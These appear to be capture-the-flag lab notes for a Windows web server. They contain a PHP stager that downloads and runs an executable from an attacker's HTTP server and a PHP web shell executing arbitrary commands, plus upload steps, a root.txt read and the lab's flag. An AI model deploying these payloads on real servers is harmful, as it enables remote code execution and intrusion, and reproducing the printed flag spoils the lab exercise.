Now that we have a working executable that can bypass anti-virus, we need a way to execute it. We know that web servers cannot execute applications, so we will need to write a PHP wrapper to download and execute our code for us.  

We will be using a template payload/wrapper that we can use to deploy PowerShell commands on the remote server for this task. This will allow us to download and execute our malicious application. Find the source code for the template below.  

```
 <?php  
  function compile_stager() {  
    $init = "powershell.exe";  
    $payload = ""; // Insert PowerShell payload here  
    $execution_command = "shell_exec";  
    $query = $execution_command("$init $payload");  
    echo $query; // Execute query  
  }   
  
  compile_stager();  
?>
```

The above wrapper takes advantage of the `shell_exec` command to open a process on the server and execute commands as the webserver. Of course, this will only work if you can execute privileges on the system.  

You can decide to either upload an exe grunt or create a ps1 grunt either will work with the template.  

To download our malicious grunt we can set up an HTTP server on our attacking machine using python, updog, etc and use `iex` or `Invoke-WebRequest` to make a remote call to our server. Find the download payload below.

To download our malicious grunt, we can set up an HTTP server on our attacking machine using python, updog, etc and use `iex` or `Invoke-WebRequest` to make a remote call to our server. Find the download payload below.  

`Invoke-WebRequest 127.0.0.1:8000/shell.exe -outfile notashell.exe`

To implement this payload, you will need to change the address and port to your attacking machine. You may also want to begin by identifying the webserver's root directory to identify where you can and cannot execute the file, such as if AppLocker or other solutions are employed on the server.  

After we have downloaded the file, we will want to execute it using PowerShell. First, find the execution payload below.  

`.\notashell.exe` or `cmd /c .\notashell.exe`

We can put together all payloads into the wrapper to complete our PHP payload. Find the final PHP code below.  

```
<?php  
  function get_stager() {  
    $init = "powershell.exe";  
    $payload = "Invoke-WebRequest 127.0.0.1:8000/shell.exe -outfile notashell.exe"; // Insert PowerShell payload here  
    $execution_command = "shell_exec";  
    $query = $execution_command("$init $payload");  
    echo $query; // Execute query  
  }  
 function execute_stager() {  
  $init = "powershell.exe";  
    $payload = ".\notashell.exe"; // Insert PowerShell payload here  
    $execution_command = "shell_exec";  
    $query = $execution_command("$init $payload");  
    echo $query; // Execute query  
 }  
  get_stager();  
  execute_stager();  
  die();  
?>
```

We now have a working PHP shell that operates with Covenant. You can find the source code on GitHub, [https://github.com/Cryilllic/PHP-PowerShell/tree/main](https://github.com/Cryilllic/PHP-PowerShell/tree/main).


---

# Your job

Time to try and exploit this web-app. Remember way back in [[Task 29 - Thanks, I'll let myself in.]] we found the `/images/` directory so we can run PHP code, that isn’t malicious. Well let’s give that a go.

> [!failure]
> Don't bother yourself trying the above method, according to someone else's writeups it doens't work.

Instead follow the [[Marmeus' walkthrough]].


## Uploading a web-shell to 10.200.X.31

It's used the following web-shell which didn’t get caught.

```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
system($_GET['cmd']);
}
?>
</pre>
</body>
</html>
```

1. Create a php file with the above code on your attacking machine.
2. Navigate to http://10.200.95.31/img_upload.php and upload the file.
3. Navigate to http://10.200.95.31/images/webshell.php.
	![[Task 35 - Wrapping the burrito-20241014144328981.webp]]
	Now you can run any command on the form.
	
> [!INFO]
You are root onto  S-SRV01.

---

## Flag after rooting S-SRV01

- Run the following on the form.
	`type C:\Users\Administrator\Desktop\root.txt`
	
	HOLO{50f9614809096ffe2d246e9dd21a76e1}

- Submit the user flag on Task 4, question 5.

**Next step:** [[Task 36 -  That's not a cat that's a dawg]]
